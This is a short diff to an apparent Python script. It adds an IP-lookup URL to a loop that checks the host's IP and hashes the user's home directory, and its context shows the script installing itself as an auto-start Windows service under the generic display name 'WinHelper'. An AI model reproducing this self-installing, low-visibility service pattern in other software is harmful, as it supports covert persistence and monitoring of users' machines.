@@ -33,6 +33,7 @@ sc_line = '''sc create SuperAwesomeWindowsHelper
 binPath= "{}"
 DisplayName= "WinHelper"
 start= auto'''.format(os.path.join(user_home, myself))
+whats_my_ip = 'http://ipv4bot.whatismyipaddress.com/'
 
 
 # Functions
@@ -176,7 +177,7 @@ def main():
     while True:
         try:
             next_call = time.time()
-            ip_req_response = get_host_ip()
+            ip_req_response = get_host_ip(whats_my_ip)
             # TODO: Merge with file search
             md5hash = checksumdir.dirhash(user_home, 'md5')
 
